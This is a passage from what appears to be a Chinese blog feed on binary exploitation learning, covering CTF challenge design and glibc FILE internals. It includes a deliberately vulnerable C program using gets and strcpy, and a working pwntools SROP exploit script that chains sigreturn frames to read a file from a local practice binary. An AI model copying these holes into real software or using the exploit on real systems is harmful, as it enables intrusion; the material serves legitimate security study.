src=\"/pwn%E5%85%A5%E9%97%A8-38-%E6%9C%88%E8%B5%9B%E5%87%BA%E9%A2%983%E9%81%93/image-20230916141427362.png\" alt=\"image-20230916141427362\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-38-%E6%9C%88%E8%B5%9B%E5%87%BA%E9%A2%983%E9%81%93/image-20230916141359497.png\" alt=\"image-20230916141359497\"></p>\n<h2 id=\"开启PIE\"><a href=\"#开启PIE\" class=\"headerlink\" title=\"开启PIE\"></a>开启PIE</h2><p>​\t\t进行枚举, 随机化程度是多少呢??</p>\n<h2 id=\"踩坑-改为用户输入\"><a href=\"#踩坑-改为用户输入\" class=\"headerlink\" title=\"踩坑,改为用户输入\"></a>踩坑,改为用户输入</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span>    </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span>    </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">evilfunction</span><span class=\"params\">(<span class=\"type\">char</span> *input)</span> &#123;    </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">char</span> buffer[<span class=\"number\">512</span>];    </span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(buffer, input);    </span><br><span class=\"line\">&#125;    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span> &#123;    </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">char</span> input[<span class=\"number\">580</span>];</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;welcome to here,please give me something&quot;</span>);</span><br><span class=\"line\">    gets(input);</span><br><span class=\"line\">    evilfunction(input);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;    </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h1 id=\"SROP\"><a href=\"#SROP\" class=\"headerlink\" title=\"SROP\"></a>SROP</h1><p>​\t\t本来寻思直接给个&#x2F;bin&#x2F;sh会简单,后来发现好像和原题差不多…然后不如加个系统调用限制(不过好像过滤的不完全,还是能getshell?)</p>\n<p>如何直接写汇编呢？ （也可以写一篇分析</p>\n<p><a href=\"https://blog.csdn.net/qq_27816307/article/details/50995042\">https://blog.csdn.net/qq_27816307/article/details/50995042</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">section .data            ; 数据段声明</span><br><span class=\"line\">        msg db &quot;Hello, world!&quot;, 0xA     ; 要输出的字符串</span><br><span class=\"line\">        len equ $ - msg                 ; 字串长度</span><br><span class=\"line\"></span><br><span class=\"line\">section .text            ; 代码段声明</span><br><span class=\"line\">global _start            ; 指定入口函数</span><br><span class=\"line\">_start:                  ; 在屏幕上显示一个字符串</span><br><span class=\"line\">mov eax, 4       ; 系统调用号(sys_write)</span><br><span class=\"line\">;man 2 write 可以查看write系统调用的功能</span><br><span class=\"line\">;write函数原型： ssize_t write(int fd,const void *buf,size_t count);</span><br><span class=\"line\">mov ebx, 1       ; 参数一：文件描述符(stdout)</span><br><span class=\"line\">mov ecx, msg     ; 参数二：要显示的字符串</span><br><span class=\"line\">mov edx, len     ; 参数三：字符串长度</span><br><span class=\"line\">int 0x80         ; 调用内核功能。软中断，陷入内核</span><br><span class=\"line\">mov eax, 1       ; 系统调用号(sys_exit)</span><br><span class=\"line\">mov ebx, 0       ; 参数一：退出代码</span><br><span class=\"line\">int 0x80         ; 调用内核功能</span><br></pre></td></tr></table></figure>\n\n\n\n<p>nasm 注意编译多少位的，blog里面是32的，64的话</p>\n<p>nams -f elf64 hello.asm</p>\n<p>用gcc链接也可以（本质都一样吧）</p>\n<p>gcc -o example example.o</p>\n<p>ld -s -o hello hello.o</p>\n<p>反汇编看一下</p>\n<p>用seccmp禁掉execve？ 还是啥</p>\n<p>先封装到c里面</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nasm -f elf64 hello.<span class=\"keyword\">asm</span></span><br><span class=\"line\">gcc -fno-<span class=\"built_in\">stack</span>-protector  -no-pie  -o myprogram <span class=\"number\">1.</span>c hello.o</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-38-%E6%9C%88%E8%B5%9B%E5%87%BA%E9%A2%983%E9%81%93/image-20230829111052913.png\" alt=\"image-20230829111052913\"></p>\n<p>objdump -s -j .rodata your_binary_file 查看字符串</p>\n<p><strong>seccomp</strong></p>\n<p>关于文件描述符的调试，gdb中如何查看呢？  Linux中又如何查看呢？</p>\n<p>1.c:4:10: fatal error: seccomp.h: 没有那个文件或目</p>\n<p>sudo apt-get install libseccomp-dev</p>\n<p>编译的时候需要加选项  -lseccomp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@ubuntu:/home/ubuntu/桌面/pwn/<span class=\"number\">8</span>月/srop/test1<span class=\"comment\"># cat exp.py</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">small = ELF(<span class=\"string\">&#x27;./test&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> args[<span class=\"string\">&#x27;REMOTE&#x27;</span>]:</span><br><span class=\"line\">    sh = remote(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">7777</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    sh = process(<span class=\"string\">&#x27;./myprogram&#x27;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh,&quot;b 0x401000&quot;)</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">syscall_ret = <span class=\"number\">0x000000000040112e</span></span><br><span class=\"line\">start_addr = <span class=\"number\">0x0000000000401120</span></span><br><span class=\"line\">payload = p64(start_addr) * <span class=\"number\">4</span></span><br><span class=\"line\"></span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">sh.send(<span class=\"string\">&quot;\\x23&quot;</span>)</span><br><span class=\"line\">stack_addr = u64(sh.recv()[<span class=\"number\">16</span>:<span class=\"number\">24</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;leak stack addr :&#x27;</span> + <span class=\"built_in\">hex</span>(stack_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_read</span><br><span class=\"line\">sigframe.rdi = <span class=\"number\">0</span> </span><br><span class=\"line\">sigframe.rsi = stack_addr</span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0x400</span></span><br><span class=\"line\">sigframe.rsp = stack_addr</span><br><span class=\"line\">sigframe.rip = syscall_ret</span><br><span class=\"line\">payload = p64(start_addr) + <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span> + <span class=\"built_in\">bytes</span>(sigframe)</span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sigreturn = p64(syscall_ret) + <span class=\"string\">b&quot;x&quot;</span>*<span class=\"number\">7</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;hereeeeeeeeeeeeeeeeeeeeeeeeeee&quot;</span>)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">sh.send(sigreturn)</span><br><span class=\"line\"></span><br><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_open</span><br><span class=\"line\">sigframe.rdi = <span class=\"number\">0x402004</span> </span><br><span class=\"line\">sigframe.rsi = <span class=\"number\">0</span></span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0</span></span><br><span class=\"line\">sigframe.rsp = stack_addr</span><br><span class=\"line\">sigframe.rip = syscall_ret</span><br><span class=\"line\">payload = p64(start_addr) + <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span> + <span class=\"built_in\">bytes</span>(sigframe)</span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sigreturn = p64(syscall_ret) + <span class=\"string\">b&quot;x&quot;</span>*<span class=\"number\">7</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;hereeeeeeeeeeeeeeeeeeeeeeeeeee&quot;</span>)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">sh.send(sigreturn)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_read</span><br><span class=\"line\">sigframe.rdi = <span class=\"number\">3</span> </span><br><span class=\"line\">sigframe.rsi = stack_addr+<span class=\"number\">0x200</span></span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0x100</span></span><br><span class=\"line\">sigframe.rsp = stack_addr</span><br><span class=\"line\">sigframe.rip = syscall_ret</span><br><span class=\"line\">payload = p64(start_addr) + <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span> + <span class=\"built_in\">bytes</span>(sigframe)</span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sigreturn = p64(syscall_ret) + <span class=\"string\">b&quot;x&quot;</span>*<span class=\"number\">7</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;hereeeeeeeeeeeeeeeeeeeeeeeeeee&quot;</span>)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">sh.send(sigreturn)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_write</span><br><span class=\"line\">sigframe.rdi = <span class=\"number\">1</span> </span><br><span class=\"line\">sigframe.rsi = stack_addr+<span class=\"number\">0x200</span></span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0x100</span></span><br><span class=\"line\">sigframe.rsp = stack_addr</span><br><span class=\"line\">sigframe.rip = syscall_ret</span><br><span class=\"line\">payload = p64(start_addr) + <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span> + <span class=\"built_in\">bytes</span>(sigframe)</span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sigreturn = p64(syscall_ret) + <span class=\"string\">b&quot;x&quot;</span>*<span class=\"number\">7</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;hereeeeeeeeeeeeeeeeeeeeeeeeeee&quot;</span>)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">sh.send(sigreturn)</span><br><span class=\"line\"></span><br><span class=\"line\">sh.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<p>白名单感觉复杂点，可以直接上黑名单</p>\n<p><a href=\"https://www.sec4.fun/2018/07/23/seccomp/\">https://www.sec4.fun/2018/07/23/seccomp/</a></p>\n<p>​\t\t</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-37-IOFILE%E5%88%9D%E6%8E%A2/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-37-IOFILE%E5%88%9D%E6%8E%A2/",
            "title": "pwn入门-37-IOFILE初探",
            "date_published": "2023-08-07T05:35:58.000Z",
            "content_html": "<p>进程中的 FILE 结构会通过_chain 域彼此连接形成一个链表，链表头部用全局变量_IO_list_all 表示，通过这个值我们可以遍历所有的 FILE 结构。</p>\n<p>啥时chain域?  如何在gdb中调试打印呢?</p>\n<p>我们可以在 libc.so 中找到 stdin\\stdout\\stderr 等符号，这些符号是指向 FILE 结构的指针，真正结构的符号是</p>\n<p>readelf怎么找符号来?</p>\n<p>readelf -s &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 | grep write@</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_IO_2_1_stderr_</span><br><span class=\"line\">_IO_2_1_stdout_</span><br><span class=\"line\">_IO_2_1_stdin_</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwn<span class=\"meta\"># readelf -s /lib/x86_64-linux-gnu/libc.so.6   |grep stdin</span></span><br><span class=\"line\">   <span class=\"number\">378</span>: <span class=\"number\">00000000001</span>ec980   <span class=\"number\">224</span> OBJECT  GLOBAL DEFAULT   <span class=\"number\">34</span> _IO_2_1_stdin_@@GLIBC_2<span class=\"number\">.2</span><span class=\"number\">.5</span></span><br><span class=\"line\">   <span class=\"number\">547</span>: <span class=\"number\">00000000001</span>ed790     <span class=\"number\">8</span> OBJECT  GLOBAL DEFAULT   <span class=\"number\">34</span> <span class=\"built_in\">stdin</span>@@GLIBC_2<span class=\"number\">.2</span><span class=\"number\">.5</span></span><br><span class=\"line\">pwn<span class=\"meta\"># readelf -s /lib/x86_64-linux-gnu/libc.so.6   |grep _IO_2_1_st</span></span><br><span class=\"line\">   <span class=\"number\">378</span>: <span class=\"number\">00000000001</span>ec980   <span class=\"number\">224</span> OBJECT  GLOBAL DEFAULT   <span class=\"number\">34</span> _IO_2_1_stdin_@@GLIBC_2<span class=\"number\">.2</span><span class=\"number\">.5</span></span><br><span class=\"line\">   <span class=\"number\">852</span>: <span class=\"number\">00000000001</span>ed6a0   <span class=\"number\">224</span> OBJECT  GLOBAL DEFAULT   <span class=\"number\">34</span> _IO_2_1_stdout_@@GLIBC_2<span class=\"number\">.2</span><span class=\"number\">.5</span></span><br><span class=\"line\">  <span class=\"number\">1427</span>: <span class=\"number\">00000000001</span>ed5c0   <span class=\"number\">224</span> OBJECT  GLOBAL DEFAULT   <span class=\"number\">34</span> _IO_2_1_stderr_@@GLIBC_2<span class=\"number\">.2</span><span class=\"number\">.5</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"FILE-结构\"><a href=\"#FILE-结构\" class=\"headerlink\" title=\"FILE 结构\"></a>FILE 结构</h1><p><a href=\"https://blog.csdn.net/xy_369/article/details/130874848\">https://blog.csdn.net/xy_369/article/details/130874848</a></p>\n<p>​\t\t关于代码, 代码存在于glibc&#x2F;libio&#x2F;中 主要是libio.h</p>\n<p>​\t\tFILE结构被一系列流操作函数(fopen() fread() fclose())等所使用,大多数的FILE结构保存在堆上(stdin、stdout、stderr除外,位于libc数据段),其指针动态创建并由fopen函数返回</p>\n<p>​\t\t</p>\n<h2 id=\"IO-FILE-plus\"><a href=\"#IO-FILE-plus\" class=\"headerlink\" title=\"_IO_FILE_plus\"></a>_IO_FILE_plus</h2><p>​\t\t在libc2.23版本中,这个结构体是_IO_FILE_plus, 包含了一个 _IO_FILE结构体和一个指向 _IO_jump_t结构体的指针vtable</p>\n<p>libioP.h</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* We always allocate an extra word following an _IO_FILE.</span></span><br><span class=\"line\"><span class=\"comment\">   This contains a pointer to the function jump table used.</span></span><br><span class=\"line\"><span class=\"comment\">   This is for compatibility with C++ streambuf; the word can</span></span><br><span class=\"line\"><span class=\"comment\">   be used to smash to a pointer to a virtual function table. */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE_plus</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  _IO_FILE file;</span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_jump_t</span> *<span class=\"title\">vtable</span>;</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t各种文件结构(   _IO_FILE )采用单链表的形式连接起来( _chain域),通过 _IO_list_all访问</p>\n<p>​\t\tvtable为函数指针结构体,存放着各种IO相关函数的指针</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-37-IOFILE%E5%88%9D%E6%8E%A2/image-20230807102222274.png\" alt=\"image-20230807102222274\"></p>\n<p>​\t</p>\n<p>像_IO_FILE_plus这种这么打印呢</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p &amp;_IO_list_all</span><br><span class=\"line\">$<span class=\"number\">1</span> = (<span class=\"keyword\">struct</span> _IO_FILE_plus **) <span class=\"number\">0x7ffff7fb05a0</span> &lt;_IO_list_all&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">pwndbg&gt;  p /x *(<span class=\"keyword\">struct</span> _IO_FILE_plus*) _IO_list_all</span><br><span class=\"line\">$<span class=\"number\">3</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">0xfbad2086</span>,</span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_buf_end = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_save_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_backup_base = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _IO_save_end = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _markers = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _chain = <span class=\"number\">0x7ffff7fb06a0</span>,</span><br><span class=\"line\">    _fileno = <span class=\"number\">0x2</span>,</span><br><span class=\"line\">    _flags2 = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _old_offset = <span class=\"number\">0xffffffffffffffff</span>,</span><br><span class=\"line\">    _cur_column = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _vtable_offset = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _shortbuf = &#123;<span class=\"number\">0x0</span>&#125;,</span><br><span class=\"line\">    _lock = <span class=\"number\">0x7ffff7fb17d0</span>,</span><br><span class=\"line\">    _offset = <span class=\"number\">0xffffffffffffffff</span>,</span><br><span class=\"line\">    _codecvt = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _wide_data = <span class=\"number\">0x7ffff7faf780</span>,</span><br><span class=\"line\">    _freeres_list = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _freeres_buf = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    __pad5 = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _mode = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">    _unused2 = &#123;<span class=\"number\">0x0</span> &lt;repeats <span class=\"number\">20</span> times&gt;&#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  vtable = <span class=\"number\">0x7ffff7fac4a0</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>vtable 是 IO_jump_t 类型的指针，IO_jump_t 中保存了一些函数指针，在后面我们会看到在一系列标准 IO 函数中会调用这些函数指针</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p /x *(<span class=\"keyword\">struct</span> _IO_jump_t*) _IO_list_all.vtable</span><br><span class=\"line\">$<span class=\"number\">2</span> = &#123;</span><br><span class=\"line\">  __dummy = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">  __dummy2 = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">  __finish = <span class=\"number\">0x7ffff7e52f50</span>,</span><br><span class=\"line\">  __overflow = <span class=\"number\">0x7ffff7e53d80</span>,</span><br><span class=\"line\">  __underflow = <span class=\"number\">0x7ffff7e53a20</span>,</span><br><span class=\"line\">  __uflow = <span class=\"number\">0x7ffff7e54f50</span>,</span><br><span class=\"line\">  __pbackfail = <span class=\"number\">0x7ffff7e56680</span>,</span><br><span class=\"line\">  __xsputn = <span class=\"number\">0x7ffff7e525d0</span>,</span><br><span class=\"line\">  __xsgetn = <span class=\"number\">0x7ffff7e52240</span>,</span><br><span class=\"line\">  __seekoff = <span class=\"number\">0x7ffff7e51860</span>,</span><br><span class=\"line\">  __seekpos = <span class=\"number\">0x7ffff7e55600</span>,</span><br><span class=\"line\">  __setbuf = <span class=\"number\">0x7ffff7e51530</span>,</span><br><span class=\"line\">  __sync = <span class=\"number\">0x7ffff7e513c0</span>,</span><br><span class=\"line\">  __doallocate = <span class=\"number\">0x7ffff7e44c70</span>,</span><br><span class=\"line\">  __read = <span class=\"number\">0x7ffff7e525a0</span>,</span><br><span class=\"line\">  __write = <span class=\"number\">0x7ffff7e51e60</span>,</span><br><span class=\"line\">  __seek = <span class=\"number\">0x7ffff7e51600</span>,</span><br><span class=\"line\">  __close = <span class=\"number\">0x7ffff7e51520</span>,</span><br><span class=\"line\">  __stat = <span class=\"number\">0x7ffff7e51e40</span>,</span><br><span class=\"line\">  __showmanyc = <span class=\"number\">0x7ffff7e56810</span>,</span><br><span class=\"line\">  __imbue = <span class=\"number\">0x7ffff7e56820</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">      </span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"初始情况\"><a href=\"#初始情况\" class=\"headerlink\" title=\"初始情况\"></a>初始情况</h2><p>​\t\t初始情况下_IO_FILE 结构有<code>_IO_2_1_stderr_</code> ，<code>_IO_2_1_stdout_</code>，<code>_IO_2_1_stdin_</code> 三个,通过 <code>_IO_list_all</code>连接起来</p>\n<p>stdfiles.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\"># <span class=\"keyword\">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class=\"line\"><span class=\"meta\">#  <span class=\"keyword\">define</span> DEF_STDFILE(NAME, FD, CHAIN, FLAGS) \\</span></span><br><span class=\"line\"><span class=\"meta\">  static struct _IO_wide_data _IO_wide_data_##FD \\</span></span><br><span class=\"line\"><span class=\"meta\">    = &#123; ._wide_vtable = &amp;_IO_wfile_jumps &#125;; \\</span></span><br><span class=\"line\"><span class=\"meta\">  struct _IO_FILE_plus NAME \\</span></span><br><span 